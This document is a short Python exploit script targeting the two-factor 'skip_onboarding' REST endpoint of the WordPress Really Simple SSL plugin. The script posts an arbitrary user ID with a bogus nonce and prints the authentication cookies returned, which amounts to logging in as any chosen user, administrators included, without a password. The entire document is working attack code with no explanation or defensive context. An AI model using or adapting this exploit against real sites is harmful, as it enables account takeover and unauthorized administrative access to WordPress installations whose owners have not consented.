import requests
import urllib.parse
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <user_id>")
    sys.exit(1)

user_id = sys.argv[1]

url = "http://localhost:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),
    "login_nonce": "invalid_nonce",
    "redirect_to": "/wp-admin/"
}

response = requests.post(url, json=data)

if response.status_code == 200:
    print("Request successful!\n")
    cookies = response.cookies.get_dict()
    count = 1
    for name, value in cookies.items():
        decoded_value = urllib.parse.unquote(value)
        print(f"Cookie {count}:")
        print(f"Cookie Name: {name}")
        print(f"Cookie Value: {decoded_value}\n")
        count += 1
else:
    print("Request failed!")
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
